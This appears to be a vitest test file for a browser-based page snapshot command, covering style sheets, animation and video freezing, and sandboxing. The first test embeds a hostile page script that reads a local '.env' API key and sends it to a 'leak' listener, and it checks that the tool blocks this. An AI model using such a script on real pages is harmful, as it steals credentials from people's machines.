/**
 * `swarmloom snapshot` of local HTML files and web pages against a real browser, with the test double of
 * the snapshot script. Skipped (with the reason) when the machine has no Chrome; under CI that fails
 * instead (see ./real-deps), and a wrong SWARMLOOM_CHROME always does.
 */

import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { launchBrowser, newContext } from "../src/browser/launch";
import { snapshotPage } from "../src/browser/snapshot";
import { snapshotCommand } from "../src/commands/snapshot";
import { findBrowser } from "../src/discovery/browser";
import { systemHost } from "../src/discovery/host";
import { findOptional, skipReason } from "./real-deps";

const FIXTURES = path.join(import.meta.dirname, "fixtures");
const SNAPSHOT_DOUBLE = path.join(FIXTURES, "snapshot.js");
/**
 * 2 s, 2 fps, 16x16 VP9, as a data: URL so it is seekable to any time (a server without range requests
 * allows only 0). `ffmpeg -f lavfi -i testsrc2=size=16x16:rate=2:duration=2 -c:v libvpx-vp9 -b:v 10k`
 */
const CLIP =
  "data:video/webm;base64," +
  "GkXfo59ChoEBQveBAULygQRC84EIQoKEd2VibUKHgQJChYECGFOAZwEAAAAAAANoEU2bdLpNu4tTq4QVSalmU6yBoU27i1OrhBZU" +
  "rmtTrIHGTbuMU6uEElTDZ1OsggETTbuMU6uEHFO7a1OsggNS7AEAAAAAAABZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVSalmoCrXsYMPQkBNgIRM" +
  "YXZmV0GETGF2ZkSJiECfQAAAAAAAFlSua8iuAQAAAAAAAD/XgQFzxYgAAAAAAAAAAZyBACK1nIN1bmSIgQCGhVZfVlA5g4EBI+OD" +
  "hB3NZQDgkLCBELqBEJqBAlWwhFW5gQESVMNn1HNz0WPAi2PFiAAAAAAAAAABZ8icRaOHRU5DT0RFUkSHj0xhdmMgbGlidnB4LXZw" +
  "OWfIoUWjiERVUkFUSU9ORIeTMDA6MDA6MDIuMDAwMDAwMDAwAB9DtnVB4OeBAKNBFYEAAICCSYNCAADwAPYAOCQcGEIAACAgAHxk" +
  "0v//kDq8D8+qkaGs4//JQxsI3/u46WxXDTaLnn//9xawII6zKme1fu7dX//1FZh6+uvcNvLHC9CfhABtMv/3r51JQEj3t/kBMjky" +
  "3CvduZ1TdN+9rK1rm6v/0i3jXITM12CmOfanFVFpOiJUv/8T1b0n8b6cODpPXpQ9zcrZI5fv0VOqgFZw6Zs6iZq33wB91JFbH9ay" +
  "76qXK/+v+iJ12870ebazr8AobxLwl53uaZvJBx26VTfey3R2c86quJK+M92g+L9+YgWpvpRdf2/jbT6Z8BO/JxTOXSzf/TdGZ99R" +
  "jpr8Qk3rvEPjbj84lvNJRF+H1rg7FYdmQACjzYEB9ACGAECSnBBJQAADAAAAZWYS3//RnKML//mjIA1M6vlmQF0P8sf//+dlPY57" +
  "ZdWP7I/xjuis0Dy8X7RuMNTbyHHdcw9G9Q8MFdWAo72BA+gAhgBAkpwQSsAAA3AAAG4SMtjgT//2Qr+MNXWFfy2//MgoODq9Bfr2" +
  "2B688do/u6Rpne/1Ee7lHtkAo7WBBdwAhgBAkpwQScAAAwAAABO/fKVbZl8GEogFKWYyf9jkFymkDqvBosdTxM5hTgaELdOiABxT" +
  "u2uRu4+zgQC3iveBAfGCAWzwgQM=";
const chrome = (await findOptional("SWARMLOOM_CHROME", () => findBrowser(systemHost())))?.path;
const missing = skipReason(chrome ? undefined : "no Chrome/Chromium found (set SWARMLOOM_CHROME)");

describe.skipIf(missing)(`snapshot in a real browser${missing ? ` (skipped: ${missing})` : ""}`, () => {
  it("keeps the page's scripts and requests away from the folder and other sites", async () => {
    const hits: string[] = [];
    const listener = createServer((req, res) => {
      hits.push(req.url ?? "");
      res.end();
    });
    await new Promise<void>((resolve) => listener.listen(0, "127.0.0.1", resolve));
    const leak = `http://127.0.0.1:${(listener.address() as AddressInfo).port}/leak`;
    const dir = await mkdtemp(path.join(tmpdir(), "swarmloom-snapshot-"));
    try {
      await writeFile(path.join(dir, ".env"), "API_KEY=topsecret");
      await writeFile(
        path.join(dir, "page.html"),
        `<!doctype html><title>t</title><p id="out">static text</p><img src="${leak}?img">
<script>fetch(".env").then((r) => r.text()).then((t) => {
  document.getElementById("out").textContent = "READ " + t;
  fetch("${leak}?d=" + encodeURIComponent(t), { mode: "no-cors" });
});</script>`,
      );
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [path.join(dir, "page.html"), "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: dir,
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const json = out.join("\n");
      expect(json).toContain("static text");
      expect(json).not.toContain("topsecret");
      expect(hits).toEqual([]);
    } finally {
      listener.close();
      await rm(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("loads the style sheet next to a local HTML file", async () => {
    const out: string[] = [];
    const io = { out: (line: string) => out.push(line), err: () => {} };
    const argv = [path.join(FIXTURES, "page/index.html"), "-o", "-", "--chrome", chrome as string, "--quiet"];
    const code = await snapshotCommand.run(argv, {
      io,
      cwd: FIXTURES,
      env: {},
      assets: { snapshotBundle: SNAPSHOT_DOUBLE },
    });
    expect(code).toBe(0);
    // style.css sets it; without the file the body stays transparent.
    expect(JSON.parse(out.join("\n")).background).toBe("rgb(1, 2, 3)");
  }, 120_000);

  it("captures animations in a pose that does not depend on when the capture ran", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "swarmloom-snapshot-"));
    try {
      // Body margin 8 px. A finite slide ends at +100 px; endless ones in the document and an open
      // shadow root pause half a cycle in, at +150 px and 150 px wide.
      await writeFile(
        path.join(dir, "page.html"),
        `<!doctype html><title>t</title><style>
@keyframes a { from { transform: translateX(0) } to { transform: translateX(100px) } }
@keyframes b { from { transform: translateX(0) } to { transform: translateX(300px) } }
h1 { animation: a 60s linear forwards } p { animation: b 1s linear infinite }
#shadow { display: inline-block; animation: none }
</style><h1>once</h1><h1 id="shadow">shadow<template shadowrootmode="open"><style>
@keyframes inside { from { width: 0 } to { width: 300px } }
.inner { display: block; height: 1px; animation: inside 1s linear infinite }
</style><span class="inner"></span></template></h1><p>loop</p>`,
      );
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [path.join(dir, "page.html"), "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: dir,
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string; box: { x: number; w: number } }[] };
      expect(layers.map((l) => [l.text, Math.round(l.box.x)])).toEqual([
        ["once", 108],
        ["shadow", 8],
        ["loop", 158],
      ]);
      expect(Math.round(layers.find((l) => l.text === "shadow")?.box.w ?? 0)).toBe(150);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("freezes the transitions the pre-scroll pass starts", async () => {
    // A card below the fold slides 100 px over 60 s once it scrolls into view: read at its end state.
    const page = `<!doctype html><title>t</title><style>
.card { transition: transform 60s linear } .card.in { transform: translateX(100px) }
</style><div style="height: 3000px"></div><p class="card">card</p>
<script>new IntersectionObserver((entries) => {
  for (const e of entries) if (e.isIntersecting) e.target.classList.add("in");
}).observe(document.querySelector(".card"));</script>`;
    const server = createServer((_req, res) => res.setHeader("content-type", "text/html").end(page));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [url, "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: tmpdir(),
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string; box: { x: number } }[] };
      expect(layers.map((l) => [l.text, Math.round(l.box.x)])).toEqual([["card", 108]]);
    } finally {
      server.close();
    }
  }, 120_000);

  it("freezes the loops that the freeze itself starts", async () => {
    // Ending the entrance animation and pausing the video fire events that start endless slides;
    // both are read half a cycle in (+150 px), not wherever real time had them. A Web Animation
    // whose finish handler plays the same object again must stay at its end too (+300 px), and so
    // must a CSS animation that its animationend handler restarts as a new object by a class toggle,
    // also when that handler listens in the capture phase ahead of the freeze: at the window, or at
    // an open shadow root, which its end events do not leave, through EventTarget's own method.
    const page = `<!doctype html><title>t</title><style>
@keyframes enter { from { transform: translateX(0) } to { transform: translateX(10px) } }
@keyframes slide { from { transform: translateX(0) } to { transform: translateX(300px) } }
.enter { animation: enter 60s linear forwards } .slide { animation: slide 1s linear infinite }
.pop { animation: slide 60s linear forwards }
</style><p id="chain" class="enter">chain</p><p id="paused">paused</p><p id="replayed">replayed</p>
<p id="restarted" class="pop">restarted</p><p id="windowed" class="pop">windowed</p>
<div id="host"><p>shadowed</p></div>
<video autoplay muted loop playsinline src="${CLIP}"></video>
<script>
const chain = document.getElementById("chain");
chain.addEventListener("animationend", (e) => { if (e.animationName === "enter") chain.className = "slide"; });
document.querySelector("video").addEventListener("pause", () => { document.getElementById("paused").className = "slide"; });
const replayed = document.getElementById("replayed").animate(
  [{ transform: "translateX(0)" }, { transform: "translateX(300px)" }],
  { duration: 60000, fill: "forwards" },
);
replayed.onfinish = () => { replayed.currentTime = 0; replayed.play(); };
const restarted = document.getElementById("restarted");
restarted.addEventListener("animationend", () => {
  restarted.classList.remove("pop");
  void restarted.offsetWidth;
  restarted.classList.add("pop");
});
const windowed = document.getElementById("windowed");
addEventListener("animationend", (e) => {
  if (e.target !== windowed) return;
  windowed.classList.remove("pop");
  void windowed.offsetWidth;
  windowed.classList.add("pop");
}, true);
const shadow = document.getElementById("host").attachShadow({ mode: "open" });
shadow.innerHTML = "<style>" + document.querySelector("style").textContent + "</style><div class=pop><slot></slot></div>";
EventTarget.prototype.addEventListener.call(shadow, "animationend", (e) => {
  e.target.classList.remove("pop");
  void e.target.offsetWidth;
  e.target.classList.add("pop");
}, true);
</script>`;
    const server = createServer((_req, res) => res.setHeader("content-type", "text/html").end(page));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [url, "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: tmpdir(),
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string; box: { x: number } }[] };
      expect(layers.map((l) => [l.text, Math.round(l.box.x)])).toEqual([
        ["chain", 158],
        ["paused", 158],
        ["replayed", 308],
        ["restarted", 308],
        ["windowed", 308],
        ["shadowed", 308],
      ]);
    } finally {
      server.close();
    }
  }, 120_000);

  it("leaves the page's addEventListener wrapper in the path of its shadow root listeners", async () => {
    // zone.js and error trackers wrap EventTarget.prototype.addEventListener after the init script ran;
    // a listener the page adds at a shadow root must still go through that wrapper.
    const page = `<!doctype html><title>t</title><div id="host"></div><p id="out"></p>
<script>
const native = EventTarget.prototype.addEventListener;
let wrapped = 0;
EventTarget.prototype.addEventListener = function (...args) { wrapped++; return native.apply(this, args); };
const root = document.getElementById("host").attachShadow({ mode: "open" });
root.addEventListener("animationend", () => {});
root.addEventListener("click", () => {});
document.getElementById("out").textContent = "wrapped " + wrapped;
</script>`;
    const server = createServer((_req, res) => res.setHeader("content-type", "text/html").end(page));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [url, "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: tmpdir(),
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string }[] };
      expect(layers.map((l) => l.text)).toEqual(["wrapped 2"]);
    } finally {
      server.close();
    }
  }, 120_000);

  it("stops playing videos in the same pose as animations", async () => {
    const page = `<!doctype html><title>t</title>
<video id="loop" autoplay muted loop playsinline src="${CLIP}"></video>
<video id="once" autoplay muted playsinline src="${CLIP}"></video><p id="out"></p>
<script>
const videos = [...document.querySelectorAll("video")];
const show = () => { document.getElementById("out").textContent = videos.map((v) => v.id + " " + v.paused + " " + (v.currentTime / v.duration).toFixed(2)).join(", "); };
for (const v of videos) for (const type of ["playing", "pause", "seeked"]) v.addEventListener(type, show);
</script>`;
    const server = createServer((_req, res) => res.setHeader("content-type", "text/html").end(page));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [url, "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: tmpdir(),
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string }[] };
      // Loops half a cycle in, single runs at their end.
      expect(layers.map((l) => l.text)).toEqual(["loop true 0.50, once true 1.00"]);
    } finally {
      server.close();
    }
  }, 120_000);

  it("captures a page whose video freeze never ends once the step times out", async () => {
    // The video starts after load and never answers, and the page drops long timers, so the in-page
    // 3 s deadline never fires. Starting it earlier would make page.goto itself time out on Windows.
    const page = `<!doctype html><title>t</title><h1>Hello</h1><video autoplay muted></video>
<script>const st = setTimeout; window.setTimeout = (f, d, ...a) => (d >= 1000 ? 0 : st(f, d, ...a));
addEventListener("load", () => { document.querySelector("video").src = "/stall.mp4"; });</script>`;
    const server = createServer((req, res) => {
      if (req.url === "/") res.setHeader("content-type", "text/html").end(page);
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const launch = { webPages: true, requireSandbox: false, onUnsandboxed: () => {} };
    const browser = await launchBrowser(chrome as string, launch);
    try {
      const view = { width: 800, height: 600, scale: 1, colorScheme: "light", locale: "en-US" } as const;
      const context = await newContext(browser, view);
      const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
      const bundle = await readFile(SNAPSHOT_DOUBLE, "utf8");
      const { blueprint } = await snapshotPage(context, { url, bundle, timeoutMs: 5000 });
      expect(blueprint.layers.map((l) => (l as { text?: string }).text)).toEqual(["Hello"]);
    } finally {
      await browser.close();
      server.closeAllConnections();
      server.close();
    }
  }, 60_000);
});
